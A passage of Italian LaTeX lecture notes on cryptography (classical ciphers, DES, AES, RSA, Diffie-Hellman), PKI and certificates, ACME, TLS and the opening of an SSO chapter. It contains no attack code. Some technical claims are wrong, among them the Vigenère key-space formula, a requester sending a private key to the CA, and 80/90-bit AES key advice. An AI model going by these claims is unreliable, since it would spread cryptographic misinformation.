        \paragraph{Quando l'una e quando l'altra} Usiamo funzioni di hash quando non abbiamo bisogno di accedere all'informazione originale, ma solo di verificare l'integrità dei dati. Ricordiamo che le funzioni di \textbf{hash} per definizione sono \textbf{one-way} e \textbf{deterministiche}, quindi non possiamo de-cifrarle e non necessitiamo di una chiave per cifrare i dati. \newline
        D'altro canto usiamo la cifratura quando i dati che vogliamo proteggere devono poter essere letti e ne vogliamo preservare la \textbf{confidenzialità}, bisogna prima concordare una \textbf{chiave} in maniera sicura, poi calcolare il \textbf{messaggio cifrato} con suddetta chiave e infine inviare il messaggio cifrato, il destinatario potrà de-cifrare il messaggio con la chiave concordata. In questo modo proteggiamo la \textbf{confidenzialità} e la \textbf{riservatezza} dei dati ma non la loro \textbf{integrità}.
    \subsection{La Criptografia non è la soluzione a tutti i problemi}
        \paragraph{Perchè?} La crittografia non è la soluzione a tutti i problemi di sicurezza, in quanto comunque è sensibile a delle chiavi conservate su supporti digitali, i quali devono proteggere questa informazione. Inoltre da sola la crittografia non è mai usata come soluzione a problemi di sicurezza, ma sempre in combinazione con altri meccanismi di sicurezza.
\section{Types of cryptography - Tipologie di criptografia}
    \subsection{Cifrari di sostituzione}
        \paragraph{In breve} I \textbf{cifrari di sostituzione} sono cifrari che sostituiscono un simbolo del \textit{dizionario} con un altro simbolo. In questo contesto la \textit{chiave} è la \textit{sostituzione} dei simboli.
        \paragraph{In lungo}
            I \textbf{cifrari di sostituzione} sono dei \textbf{metodi di criptazione} per i quali ogni simbolo del \textbf{messaggio in chiaro} è rimpiazzato nel \textbf{messaggio cifrato} rispetto ad un prefissato sistema. I "simboli" possono essere lettere, coppie di lettere, triple di lettere, o anche una combinazione di questi, e anche altro. Il ricevente decifra il testo svolgendo le sostituzioni inverse.
        \subsubsection{Cifrario di cesare}
            Il \textbf{cifrario di Cesare} è un cifrario di sostituzione in cui il \textbf{dizionario} del testo in chiaro è spostato di un numero fisso di posizioni nell'alfabeto. Per decifrare il testo cifrato si sposta indietro dello stesso numero di posizioni.\newline
            Questo tipo di sistema viene anche chiamato: \textbf{rotazione di $k$ posizioni}, in quanto il dizionario viene ruotato di $k$ posizioni.
            \paragraph{Problemi e proprietà} Il cifrario descritto è il più semplice tra tutti come decodifica in quanto esistono solo $25$ chiavi e con un semplice attacco di \textbf{brute force}. Inoltre se non si vuole usare un attacco di \textbf{brute force} si può comunque cercare di trovare lettere comuni del messaggio cifrato e provare a ricondurle a lettere comuni dell'alfabeto.
            \begin{figure}[H]
                \centering
                \includegraphics[width=0.9\textwidth]{03/cifrarioCesare.png}
                \caption{Esempio di cifrario di Cesare spostato di 3 posizioni}
            \end{figure}
        \subsubsection{Cifrario di Vigenère}
            Il \textbf{cifrario di Vigenère} è un cifrario che prevede l'uso di una "parola chiave", se necessario ripetuta per la lunghezza del messaggio, per poi calcolare la "somma" dei valori di ogni lettera del messaggio con la corrispondente lettera della parola chiave (prendendo poi il resto della divisione per 26). Quindi assegnando ad ogni lettera un numero da 0 a 25, si somma il numero della lettera del messaggio con il numero della lettera della parola chiave, si prende il resto della divisione per 26 e si assegna alla lettera corrispondente il numero ottenuto.
            \begin{figure}[H]
                \centering
                \includegraphics[width=0.9\textwidth]{03/cifrario2.png}
                \caption{Esempio di cifrario di Vigenère chiave "lemon"}
            \end{figure}
            Per decifrare il messaggio cifrato si sottrae il numero della lettera della parola chiave al numero della lettera del messaggio e si prende il resto della divisione per 26.
            \paragraph{Vantaggi} Questo cifrario è molto più sicuro rispetto a quello di cesare in quanto come mostrato nell'esempio la lettera "A" viene codificata in quattro lettere diverse e la lettera "T" che è presente tre volte viene cifrata in due lettere corrispondenti. In quanto la parola chiave ha lunghezza "l" allora dimensione della chiave è $l^{26}$. Inoltre se la chiave è della stessa lunghezza del messaggio allora il cifrario di Vigenère è equivalente a un cifrario di sostituzione casuale il che rende impossibile la decifrazione, però ciò comporta ad una ulteriore difficoltà per il mittente e il destinatario nel concordare una chiave.
    \subsection{Cifrari di trasposizione}
        \paragraph{In breve} I \textbf{cifrari di trasposizione} sono cifrari che permutano i simboli del messaggio in chiaro. In questo contesto la \textit{chiave} è la \textit{permutazione} dei simboli.
        \paragraph{In lungo} I \textbf{cifrari di trasposizione} sono dei \textbf{metodi di criptazione} per i quali i simboli del \textbf{messaggio in chiaro} sono permutati in un certo modo per ottenere il \textbf{messaggio cifrato}. Il ricevente decifra il testo svolgendo le permutazioni inverse.
        \subsubsection{Cifrario di trasposizione per colonne}
            Il \textbf{cifrario di trasposizione per colonne} è un cifrario che permuta i simboli del messaggio in chiaro per colonne, in modo che il messaggio cifrato sia una matrice di colonne.
            \begin{figure}[H]
                \centering
                \includegraphics[width=0.5\textwidth]{03/cifrario3.png}
                \caption{Esempio di cifrario di trasposizione per colonne}
            \end{figure}
            Per decifrare il messaggio cifrato si riordinano le colonne in base alla chiave.
    \subsection{Criptografia Simmetrica}
        Come detto in precedenza la \textbf{criptografia simmetrica} prevede la stessa \textbf{chiave} per cifrare e de-cifrare i messaggi. La gestione di chi possiede le chiavi determina chi può accedere ai dati.
        \paragraph{Tipi} Esistono nella \textit{criptografia moderna} due tipi ci crittografia simmetrica:
        \begin{description}
            \item[Cifrari a flusso] I \textbf{cifrari a flusso} cifrano una "breve" porzione di un blocco di dati alla volta con una chiave che varia nel tempo. Questa tipologia si base su un \textbf{generatore di chiavi}, la cifratura è relativamente semplice (es. \texttt{XOR}) e molto spesso viene usato un bit per blocco.
            \item[Cifrari a blocchi] I \textbf{cifrari a blocchi} cifrano un blocco di dati "lungo" alla volta con una chiave fissa. Questa tipologia è più complessa e richiede uan funzione di cifratura e una di de-cifratura. Solitamente si usano blocchi di 64/128 bit.  
        \end{description}
        \subsubsection{Cifrari a flusso}
            I cifrari a flusso operano su un flusso di \textit{testo in chiaro} e producono un flusso di \textit{testo cifrato}. Lo stesso testo se ripetuto può essere cifrato in modo diverso in base al tempo nel quale è stato cifrato. I circuiti sono molto semplici e progettati per essere molto veloci.
            \begin{figure}[H]
                \centering
                \includegraphics[width=0.9\textwidth]{03/cifrarioFlusso.png}
                \caption{Esempio di circuito di cifratura a flusso}
            \end{figure}
            \paragraph{Dove si usano} I cifrari a flusso sono usati in applicazioni in cui la velocità è fondamentale, come ad esempio nelle comunicazioni via radio o nella comunicazione in tempo reale.
        \subsubsection{Cifrari a blocchi}
            Nei \textbf{cifrari a blocchi} vene trattato una sezione di \textit{testo in chiaro} come una cosa unica per produrre un \textit{testo cifrato} di egual lunghezza. La dimensione tipica di questa sezione è solitamente tra $64$ e $128$ bit. Un messaggio $M$ più lungo di $n$ bit viene diviso in blocchi di $n$ bit e ogni blocco ($M_1, M_2, \dots, M_i$) viene cifrato separatamente con la stessa chiave $k$.
            \paragraph{Esempi} Alcuni esempi di cifrari a blocchi sono:
            \begin{description}
                \item[DES] \textbf{Data Encryption Standard} è un cifrario a blocchi che opera su blocchi di $64$ bit.
                \item[AES] \textbf{Advanced Encryption Standard} è un cifrario a blocchi che opera su blocchi di $128$ bit e utilizza chiavi di $128$, $192$ o $256$ bit.
            \end{description}
            \paragraph{DES}
                Il \textbf{Data Encryption Standard} è un cifrario a blocchi che opera su blocchi di $64$ bit che venne progettato da \texttt{IBM} negli anni '70. Il cifrario è basato su una rete di sostituzione e trasposizione, e utilizza una chiave di $56$ bit. Il DES è stato il cifrario più usato fino al 2000 (anche da ANS\footnote{American National Standard X3.92} e in tre F.I.P.S.\footnote{Federal Information Processing Standards}), fino al 2005 quando è stato definitivamente dichiarato insicuro.
            \paragraph{Feistel (1973)}
                Il cifrario DES è basato su una struttura di \textbf{Feistel}, la quale prevede che il testo in chiaro venga diviso in due parti uguali, la prima passa attraverso una funzione di cifratura insieme ad una chiave, il risultato viene messo in \textbf{XOR} con la seconda parte del testo in chiaro, il risultato viene poi scambiato con la prima parte e il processo viene ripetuto per $16$ volte con $16$ chiavi diverse (o una chiave divisa in $16$ parti). La decodifica avviene tramite lo stesso processo ma con le chiavi e le parti invertite.
                \subparagraph{Vantaggi e svantaggi} Primo vantaggio di questo algoritmo è lo stesso meccanismo di cifratura e de-cifratura oltre alla semplicità, questo rende le componenti hardware molto più semplici e meno costose in quanto non necessitano di componenti diverse per cifrare e de-cifrare. 
            \paragraph{AES} \label{par:AES}
                L'\textbf{Advanced Encryption Standard} è un cifrario a blocchi sviluppato come successore del \texttt{DES} dal dicembre 2001. L'\texttt{AES} usa una chiave simmetrica in uno schema chiamato \textbf{Rijndael}.\newline
                Il processo di cifratura è basato su una serie di tabelle che contengono le operazioni da eseguire e di operazioni \texttt{XOR} che sono molto veloci e semplici conoscendo la chiave, l'operazione di de-cifratura è la stessa ma con le tabelle invertite. Tuttavia anche se il processo è lo stesso bisogna costruire hardware e software diversi per cifrare e de-cifrare.
    \subsection{Criptografia Asimmetrica}
        La \textbf{criptografia asimmetrica} anche chiamata \textbf{\textit{Crittografia a chiave pubblica}} \textbf{\texttt{PKC}} prevede l'uso di due chiavi diverse, una per cifrare e una per de-cifrare. Questo sistema viene usato per avere una comunicazione sicura tra due parti in un contesto non sicuro.
        \paragraph{One way function} Le \textbf{funzioni one way} sono funzioni matematiche che costituiscono la base della crittografia asimmetrica, queste funzioni sono facili da calcolare in una direzione ma molto difficili nell'altra. Nella crittografia asimmetrica tuttavia usiamo funzioni \textit{one-way} che contengono una così detta \textit{trapdoor} o \textit{backdoor} che permette di invertire la funzione in modo semplice se si conosce un certo parametro.
        \subparagraph{Caso dell'\texttt{RSA}}
            Nell'\texttt{RSA} viene usata una funzione matematica che è facile da calcolare in una direzione ma molto difficile nell'altra, ovvero la \textbf{fattorizzazione di numeri primi}.
        \paragraph{Le chiavi} Le due chiavi usate nella crittografia asimmetrica sono due, una per cifrare e una per de-cifrare, la chiave pubblica è usata per cifrare i messaggi e la chiave privata è usata per de-cifrarli. La chiave pubblica è distribuita a tutti. Queste chiavi sono diverse ma corelate matematicamente anche se la conoscenza di una non permette la conoscenza dell'altra.
        \subsubsection{\texttt{RSA} - \textit{(Rivest, Shamir, Adleman)}}
            \label{subsubsec:RSA}
            L'\texttt{RSA} è un algoritmo di crittografia asimmetrica più usato al mondo, è basato sulla difficoltà di fattorizzare numeri primi molto grandi. L'algoritmo è stato inventato nel 1977 da \texttt{Ron Rivest}, \texttt{Adi Shamir} e \texttt{Leonard Adleman}. Oggi è il sistema di crittografia più usato al mondo e viene usato per scambio di chiavi, firme digitali e per la crittografia di dati.
            \paragraph{Funzionamento} Si prendono due numeri $ p $ e $ q $ entrambi primi molto grandi \footnote{generatore di numeri casuali e controllo che questi siano primi}, poi si calcola il prodotto $N=p\cdot q$ questo sarà il \textbf{modulo}. Ora si prende un qualsiasi numero $ e $ tale che questo sia primo rispetto a $ (p-1)(q-1) $, con questo troviamo $ d $ definito come l'inverso del modulo $ e $ come $ d\cdot e = 1 \mod (p-1)(q-1) $. La chiave pubblica sarà $ (N,e) $ e la chiave privata sarà $ (N,d) $. Assumendo quindi che $ M $ con $ 0 < M < N $ sia il messaggio da cifrare, il messaggio cifrato sarà $ C = M^e \mod N $ e il messaggio de-cifrato sarà $ M = C^d \mod N $. Notare come $ C^d \mod N = (M^e \mod N)^d \mod N = M^{ed} \mod N = M $.
            \subparagraph{Attacchi} In quanto $ N $ e $ e $ sono pubblici se un attaccante riesce a fattorizzare $ N $ allora può usarlo per calcolarsi $ d $ e quindi de-cifrare i messaggi in quanto $ e\cdot d = 1 \mod (p-1)(q-1) $. Per questo motivo è importante che $ N $ sia molto grande e che $ p $ e $ q $ siano molto grandi. 
            \paragraph{Un problema recente con \texttt{RSA}} Recentemente è stato scoperto un problema relativo alla generazioni di chiavi \texttt{RSA} infatti una libreria software usata nelle \textit{smartcard}, \textit{security tokens} e \textit{trusted platform modules} per generare chiavi \texttt{RSA} presentava una vulnerabilità: la libreria non generava in modo casuale le chiavi ma usava un generatore di numeri pseudo-casuali che permetteva di conoscere la chiave privata conoscendo la chiave pubblica. Questo problema è stato riscontrato in molti dispositivi che sono stati prodotti con questa libreria, questi dispositivi sono stati ritirati dal mercato e sostituiti.
            \paragraph{Integrità con \texttt{RSA}}
                Per verificare l'integrità di un messaggio si può usare la crittografia \texttt{RSA} a proprio vantaggio. Prendiamo un messaggio, ce ne calcoliamo l'\textit{hash} tramite una funzione di \textit{hashing}, ora grazie alla chiave privata il mittente cifra il \textit{digest} ottenuto e invia messaggio e \textit{digest} cifrato al destinatario. Il destinatario de-cifra il \textit{digest} grazie alla chiave pubblica del mittente e confronta e ri-calcola l'\textit{hash} del messaggio, se i due \textit{digest} coincidono allora il messaggio è integro, altrimenti se non coincidono il messaggio è stato alterato (o il messaggio o il \textit{digest}).
            \paragraph{Problemi dell'\texttt{RSA}} In generale l'unico reale problema dell'\texttt{RSA} è la lentezza, infatti la generazione delle chiavi è molto lenta e la cifratura e de-cifratura sono molto lente, per questo motivo l'\texttt{RSA} viene usato solo per scambiare chiavi simmetriche che verranno poi usate per cifrare i messaggi. In questo modo si combina la sicurezza dell'\texttt{RSA} con la velocità dei cifrari simmetrici.
                \subparagraph{\textit{store now decrypt later}} Peccato che in questo modo si è esposti ad attacchi del genere \textit{store now decrypt later} ovvero se un attaccante riesce a intercettare tutti i messaggi compreso lo scambio di una chiave allora quando sarà riuscito a de-cifrare il messaggio con la chiave simmetrica potrà de-cifrare tutti i messaggi scambiati.
                \subparagraph{Pubblicazione della chiave privata} Un altro modo per attaccare un sistema crittografico basato su \texttt{RSA} è quello che per un qualunque motivo la chiave privata venga pubblicata, in questo caso l'attaccante può de-cifrare tutti i messaggi cifrati con la chiave pubblica, e se la chiave pubblica è usata per firmare i messaggi allora l'attaccante può falsificare i messaggi. In questa situazione la coppia di chiavi deve essere revocata e sostituita con una nuova coppia.

            \subsubsection{\texttt{DH} - \textit{Diffie-Hellman}}
                La cifratura \texttt{DH}è un algoritmo crittografico che permette a due parti di scambiarsi una chiave senza che questa venga trasmessa in alcun modo tramite un canale (sicuro o meno). L'algoritmo si basa sulla complessità dell'inversione di esponenti modulari. L'algoritmo è stato inventato da \texttt{Whitfield Diffie} e \texttt{Martin Hellman} nel 1976.
                \paragraph{Fondamenti matematici} L'algoritmo si basa su un campo finito $ F = GF(p) $ che sono tutti i numeri interi modulo $ p $ con $ p $ primo. Inoltre sfrutta le proprietà degli esponenti, in quanto $ g^x(\mod p) $ è una funzione irreversibile ma semplice da calcolare. Infine viene usato il \textbf{Problema del logaritmo discreto} o \textit{\texttt{DLP}} che descrive come dati $ p,g,X $ trovare $ x $ tale che $ g^x \mod p = X $, il che è computazionalmente difficile se $ p $ è primo e $ g $ è un generatore per $ 0 < X < p $ esiste un $ x $ tale che $ g^x \mod p = X $.
                \paragraph{Funzionamento nel dettaglio} Consideriamo \texttt{A} e \texttt{B} i nostri interlocutori allora il procedimento è il seguente:
                \begin{enumerate}
                    \item \texttt{A} sceglie un numero primo $ p $ e un generatore $ g $ per $ GF(p) $ e un numero segreto $ a $.
                    \item \texttt{A} sceglie un numero $ a $ grande (chiave privata) e calcola $ A = g^a \mod p $ (chiave pubblica).
                    \item Ora \texttt{A} invia $ p $ numero primo scelto, $ g $ generatore scelto e $ A $ chiave pubblica di \texttt{A} a \texttt{B}.
                    \item \texttt{B} ricevuto $ p $, $ g $ e $ A $ sceglie un numero segreto $ b $ molto grande (chiave privata) e calcola $ B = g^b \mod p $ (chiave pubblica).
                    \item \texttt{B} invia a \texttt{A} $ B $ chiave pubblica di \texttt{B}.
                    \item Entrambi ora si calcolano la chiave risultante, \texttt{A} calcolerà $ K_a = B^a \mod p $ e \texttt{B} calcolerà $ K_b = A^b \mod p $. Si può dimostrare che $ K_a = K_b $.\footnote{$ K = A^b\mod p = (g^a \mod p)^b \mod p = g^{ab} \mod p = (g^b \mod p)^a \mod p = B^a \mod p $}
                \end{enumerate}
                \paragraph{Sicurezza del protocollo} La sicurezza di \texttt{DH} dipende dalla difficoltà del \texttt{DLP}\footnote{\textit{Discrete Logarithm Problem}} e dall'abilità di un attaccante di risolvere il \texttt{DLP}, altrimenti non è possibile ricavarsi le chiavi private da quelle pubbliche.
                    \subparagraph{\textit{men-in-the-middle}} D'altra parte il protocollo \texttt{DH} non garantisce l'autenticità del messaggio, dunque quando dell'esempio precedente \texttt{B} riceve la chiave pubblica, il numero primo e il generatore, non sà se effettivamente lo ha ricevuto da \texttt{A} allora una terza parte si può mettere nel mezzo e inviare diverse informazioni a \texttt{A} e \texttt{B} e quindi la comunicazione tra \texttt{A} e \texttt{B} intercettata da \texttt{C} usa due chiavi diverse tra \texttt{A}-\texttt{C} e tra \texttt{C}-\texttt{B} il tutto mantenendo sicure le corrispondenti chiavi private. Per risolvere questo problema si può usare la crittografia asimmetrica per autenticare le chiavi pubbliche.
\section{Riassumendo}
\begin{itemize}
    \item Bisogna evitare di crearsi il proprio algoritmo di crittografia, in quanto è molto difficile creare un algoritmo sicuro e quelli fatti in casa sono molto più vulnerabili.
    \item \textit{DES} non deve essere più usato in quanto è stato dichiarato insicuro.
    \item Consigliati blocchi di chiavi da $ 80/90 $ bit per la crittografia simmetrica usando \texttt{AES}.
    \item La sicurezza di \texttt{DES} e \texttt{AES} non è provata, è solo resistente ad attacchi conosciuti.
    \item Non dimenticarti di gestire bene le chiavi:
        \subitem come condividerla? vedi dopo
        \subitem come proteggerla? Usa un sistema di controllo degli accessi
        \subitem Con $ n $ partecipanti servono $ n^2 $ chiavi
    \item \texttt{PKC}$\neq$\texttt{RSA} in quanto alcune proprietà di \texttt{RSA} non usano nessun aspetto di \texttt{PKC}.
    \item La sicurezza effettiva dipende dallo stato dell'arte nel risolvere problemi matematici. (avanzamento tecnologico, disponibilità di risorse, ecc\dots)
    \item \texttt{DH} usato solo per scambio di chiavi ma persistono problemi di autenticità. (Attenzione agli attacchi \texttt{MITM})
\end{itemize}
    \chapter[\texttt{PKI} \& \texttt{TLS}]{Cryptography at work: \texttt{PKI} \& \texttt{TLS}}
\thispagestyle{chapterInit}
\section{Digital Certificates}
    \subsection{Introduzione}
        Il certificato digitale è un documento elettronico che contiene la chiave pubblica di un'entità, come un'organizzazione, un sito web o un individuo ben identificato tramite procedure di verifica dell'identità, spesso legislate da normative nazionali o internazionali. Il certificato è rilasciato da un'autorità di certificazione (CA) riconosciuta a livello internazionale, che garantisce l'identità del titolare del certificato. Il certificato è firmato digitalmente dalla CA, che ne garantisce l'integrità e l'autenticità. Il certificato può essere usato per autenticare l'identità del titolare, per garantire la riservatezza delle comunicazioni e per garantire l'integrità dei dati scambiati.
        Il certificato usa il paradigma della crittografia a chiave pubblica, in cui una chiave è usata per cifrare i dati e l'altra per decifrarli, infatti è composto da un certificato pubblico e da una chiave privata.
    \subsection{Struttura del certificato \texttt{X.509}}
        All'interno del certificato sono presenti le seguenti informazioni:
        \begin{description}
            \item[Version] o versione del certificato, che indica il formato del certificato.
            \item[Serial Number] o numero seriale del certificato, rispetto ad altri certificati rilasciati dalla stessa \texttt{CA}.
            \item[Signature Algorithm ID] o algoritmo di firma digitale usato per firmare il certificato.
            \item[Issuer] o autorità di certificazione, che ha rilasciato il certificato (\texttt{CA}).
            \item[Validity Period] o periodo di validità del certificato.
            \item[Subject] o titolare del certificato che lo ha richiesto, la quale identità è garantita dalla \texttt{CA}.
            \item[Subject Public Key] o chiave pubblica del titolare del certificato (\texttt{PK}).
                \subitem Algoritmo di cifratura asimmetrica usato per cifrare i dati.
                \subitem Valore della chiave pubblica.
            \item[Issuer Unique Identifier] o identificativo univoco della \texttt{CA}.
            \item[Subject Unique Identifier] o identificativo univoco del titolare del certificato.
            \item[Extensions] o estensioni del certificato, che possono contenere informazioni aggiuntive, quali nomi alternativi, restrizioni d'uso, ecc.
            \item[Signature] o firma digitale del certificato rilasciata dalla \texttt{CA} che garantisce l'integrità e l'autenticità del certificato e che questo non sia stato alterato o contraffatto.
        \end{description}
    \subsection{Certificati: domande e risposte}
        \begin{itemize}
            \item Come sono rilasciati i certificati?
            \item Chi può rilasciare i certificati?
            \item Perché dovrei fidarmi di un ente certificatore?
            \item Come posso controllare se un certificato è valido?
            \item Come posso revocare un certificato?
            \item Chi può revocare un certificato?
        \end{itemize}
        La risposta a queste domande è data dalla \texttt{PKI} (\texttt{Public Key Infrastructure}), che è un insieme di tecnologie, standard e procedure che permettono di gestire in modo sicuro le chiavi pubbliche e i certificati digitali.
\section{\textit{Public Key Infrastructure} - \texttt{PKI}}
    Una \texttt{PKI} è un insieme di tecnologie, standard e procedure che permettono di gestire in modo sicuro le chiavi pubbliche e i certificati digitali. Questa infrastruttura garantisce anche la corrispondenza tra le chiavi pubbliche e i titolari delle chiavi, garantendo l'integrità e l'autenticità delle chiavi pubbliche e dei certificati digitali.
    \subsection{Ottenere un certificato}
        Per ottenere un certificato, il titolare deve come prima cosa registrarsi presso una \texttt{CA} autorevole, la quale verifica tramite processi che possono essere automatici o manuali l'identità del richiedente. Una volta verificata l'identità del richiedente questo invia una chiave privata e pubblica da certificare alla \texttt{CA} la quale \texttt{CA} rilascia il certificato, contenete le informazioni del titolare e la chiave pubblica del titolare, questo certificato è firmato digitalmente tramite chiave privata dalla \texttt{CA} e inviato al titolare che ora può distribuirlo.
        \subsubsection{\texttt{ACME} - \texttt{Automated Certificate Management Environment}}
            \texttt{ACME} è un protocollo di gestione automatica dei certificati, che permette di automatizzare il processo di richiesta, rinnovo e revoca dei certificati digitali. Il protocollo è stato sviluppato per semplificare la gestione dei certificati digitali, riducendo i costi e i tempi di gestione dei certificati. Il protocollo è basato su un modello di autorizzazione a due fattori, in cui il richiedente deve dimostrare di avere il controllo del dominio per cui richiede il certificato e di essere autorizzato a richiedere il certificato.
            \paragraph{Let's encrypt} è un'autorità di certificazione che rilascia certificati digitali gratuitamente, tramite il protocollo \texttt{ACME}. Il servizio è stato lanciato nel 2016 con l'obiettivo di rendere l'uso dei certificati digitali più diffuso e sicuro, riducendo i costi e i tempi di gestione dei certificati. Il servizio è automatizzato e permette di ottenere un certificato digitale in pochi minuti, senza dover passare per procedure manuali di verifica dell'identità verificando l'identità del richiedente tramite il controllo del dominio per cui richiede il certificato.
            \paragraph{Funzionamento}\begin{enumerate}
                \item Il richiedente genere una coppia di chiavi pubblica e privata.
                \item Il richiedente dimostra di essere in possesso del dominio per cui richiede il certificato.
                \item Il richiedente richiede il certificato alla \texttt{CA} tramite il protocollo \texttt{ACME}.
                \item La \texttt{CA} verifica il controllo del dominio e rilascia il certificato.
                \item Il richiedente installa il certificato sul proprio server e può revocare o rinnovare il certificato in qualsiasi momento.
            \end{enumerate}
            \paragraph{Verifica del controllo del dominio}\begin{itemize}
                \item \texttt{HTTP-01}: il richiedente deve creare un file con un contenuto specifico e caricarlo sul proprio server web.
                \item \texttt{DNS-01}: il richiedente deve creare un record \texttt{TXT} con un contenuto specifico nel proprio server DNS.
                \item \texttt{TLS-ALPN-01}: il richiedente deve configurare un certificato particolare con una connessione \texttt{TLS} specifica.
            \end{itemize}
    \subsection{Requisiti su \texttt{PKI}}
        In quanto il sistema di \texttt{PKI} è distribuito a livello globale, è necessario che le \texttt{CA} e gli utenti rispettino alcuni requisiti comuni, tra cui: una politica di assegnazione nomi univoca, ogni parte della \texttt{PKI} deve provare ad alla \texttt{TTP} (\textit{Trusted Third Party}) che hanno una identità. Inoltre le \texttt{TTPs} devono controllare che quella identità sia valida e che il richiedente abbia ricevuto quella identità da una fonte affidabile. Infine le \texttt{TTPs} devono garantire che le chiavi pubbliche siano valide e che siano state rilasciate da una fonte affidabile.
        \paragraph{Requisiti dei software} Tutti i software che operano con la \texttt{PKI} devono rispettare alcuni requisiti, tra cui: devono supportare i protocolli standard della \texttt{PKI}, devono supportare i formati standard dei certificati digitali, devono supportare i meccanismi standard di verifica dei certificati digitali, devono supportare i meccanismi standard di revoca dei certificati digitali, devono supportare i meccanismi standard di gestione dei certificati digitali e devono essere aggiornati regolarmente per garantire la sicurezza dei certificati digitali.
        \subsubsection{\texttt{CRL} - \textit{Certificate Revocation List}}
            La \texttt{CRL} è una lista di certificati revocati, che contiene le informazioni sui certificati che sono stati revocati dalla \texttt{CA}. Questa lista viene aggiornata regolarmente dalla \texttt{CA} e distribuita in tutto il modo a orari regolari alle \texttt{RA} (\textit{Registration Authority}) e agli utenti. La \texttt{CRL} contiene le seguenti informazioni sui certificati revocati: il numero seriale del certificato, la data di revoca, il motivo della revoca e la \texttt{CA} che ha revocato il certificato. Una possibile criticità di questo sistema è che la \texttt{CRL} può essere ritardata nella sua distribuzione e quindi un certificato revocato può essere utilizzato per un certo periodo di tempo, non conosciuto per motivi di sicurezza.
    \subsection{Validazione di un certificato}
        La \textbf{validazione di un certificato} è il processo per il quale si verifica che un certificato sia valido, autentico e integro prima di stabilire una connessione \texttt{SSL/TLS} con un server web. Inoltre ci si assicura che il certificato non sia scaduto e che non sia stato revocato dalla \texttt{CA}. Il processo di validazione di un certificato è composto da diversi passaggi: \begin{enumerate}
            \item Il \textit{client} segue la catena di fiducia fino ad arrivare alla \texttt{CA} radice (\texttt{Root CA}).
            \item Ogni certificato nella catena di fiducia è verificato tramite la firma digitale della \texttt{CA} che lo ha rilasciato per garantire l'autenticità e l'integrità del certificato.
            \item Il \textit{client} verifica che il certificato sia valido per il periodo di validità specificato nei certificati.
            \item Viene controllato che il certificato non sia stato revocato dalla \texttt{CA} tramite la \texttt{CRL}.
            \item Infine il \textit{client} verifica che il \texttt{CN} (\textit{Common Name}) o il \texttt{SAN} (\textit{Subject Alternative Name}) del certificato corrisponda al nome del server web a cui si sta connettendo.
        \end{enumerate}
    \subsection{Catena di fiducia}
        La catena di fiducia è una struttura gerarchica che permette di garantire l'autenticità e l'integrità delle chiavi pubbliche e dei certificati digitali. La catena di fiducia è composta da una serie di entità che si fidano l'una dell'altra e che garantiscono l'autenticità e l'integrità delle chiavi pubbliche e dei certificati digitali. La catena di fiducia è basata su un modello gerarchico, in cui le entità sono organizzate in una struttura ad albero, in cui ogni entità è collegata a un'altra entità di livello superiore, fino ad arrivare a un'autorità di certificazione radice (\texttt{Root CA}).
\section{\texttt{SSL} \& \texttt{TLS} introduction}
    Come possiamo sfruttare la crittografia a chiave pubblica e l'infrastruttura \texttt{PKI} per garantire la riservatezza, l'integrità e l'autenticità delle comunicazioni su Internet? La risposta è data dal protocollo \texttt{SSL} (\textit{Secure Socket Layer}) e dal suo successore \texttt{TLS} (\textit{Transport Layer Security}), che permettono di garantire la sicurezza delle comunicazioni su Internet.
    \paragraph{\texttt{SSL}} (\textit{Secure Socket Layer}) è un protocollo di sicurezza che permette di garantire la riservatezza, l'integrità e l'autenticità delle comunicazioni su Internet. Il protocollo è basato su un modello di crittografia a chiave pubblica, in cui una chiave è usata per cifrare i dati e l'altra per decifrarli. Il protocollo è stato sviluppato da Netscape nel 1994 e ha avuto un grande successo, diventando uno standard de facto per la sicurezza delle comunicazioni su Internet.
    \paragraph{\texttt{TLS}} (\textit{Transport Layer Security}) è il successore di \texttt{SSL}, che è stato sviluppato per superare i problemi di sicurezza di \texttt{SSL} e per garantire una maggiore sicurezza delle comunicazioni su Internet. Il protocollo è basato su un modello di crittografia a chiave pubblica, in cui una chiave è usata per cifrare i dati e l'altra per decifrarli. Il protocollo è stato sviluppato dal gruppo di lavoro \texttt{IETF} (\textit{Internet Engineering Task Force}). Esistono varie versioni del protocollo, tra cui \texttt{TLS 1.0} (\texttt{RFC 2246} 1999), \texttt{TLS 1.1} (\texttt{RFC 4346} 2006), \texttt{TLS 1.2} (\texttt{RFC 5246} 2008), \texttt{TLS 1.3} (\texttt{RFC 8446} 2018), la versione \texttt{TLS 1.3} e \texttt{TLS 1.2} sono le più utilizzate e al momento coesistono nella rete.
    \paragraph{Obbiettivo di queste tecnologie} L'obiettivo di queste tecnologie è quello di garantire la riservatezza, l'integrità e l'autenticità delle comunicazioni nel web, proteggendo i dati sensibili degli utenti e garantendo la sicurezza delle transazioni online. Questo anche tramite il protocollo \texttt{HTTPS} (\textit{HyperText Transfer Protocol Secure}), che è una versione sicura del protocollo \texttt{HTTP} che utilizza il protocollo \texttt{SSL} o \texttt{TLS} per garantire la sicurezza delle comunicazioni tra il \textit{client} e il \textit{server} web.
    \chapter{Authentication II: \texttt{SSO}\& \texttt{SAML}}
\label{chap:authentication-ii}
\thispagestyle{chapterInit}
Questo capitolo è dedicato all'approfondimento dell'autenticazione all'interno di internet, in particolare verrà trattato il concetto di \texttt{Single Sign-On} per la riduzione del numero di credenziali da memorizzare e la gestione di queste ultime. Inoltre verrà trattato il protocollo \texttt{SAML} ovvero \textit{Security Assertion Markup Language} per la gestione di autenticazioni e autorizzazioni tra domini diversi, infine si parlerà di \texttt{SPID}, \texttt{CIE} \& \texttt{eIDAS} come esempi di implementazioni a livello nazionale ed europeo di \texttt{SSO}.
\section{Single Sign-On (\texttt{SSO})}
    \label{sec:sso}
    Il concetto alla base per il \texttt{SSO} è quello di avere un'unica autenticazione per accedere a (quasi) tutti i servizi, per raggiungere questo scopo il fornitore di servizi (\texttt{SP}) demanda il processo di autenticazione ad una autorità di identità (\texttt{IdP}) che si occupa di verificare che l'utente sia chi dice di essere, tramite i meccanismi visti precedentemente nella sezione \ref{sec:user-authentication}\footnote{\nameref{sec:user-authentication}}, mentre il processo di \textit{outsourcing} del processo di autenticazione è stato trattato nella sezione \ref{sec:outsourcing-authentication} \footnote{\nameref{sec:outsourcing-authentication}}.
    \paragraph{Funzionamento} Il funzionamento di un sistema \texttt{SSO} è il seguente:
        \begin{enumerate}
            \item L'utente accede all'applicazione \texttt{SP}
            \item L'applicazione \texttt{SP} reindirizza l'utente all'\texttt{IdP} per il processo di autenticazione
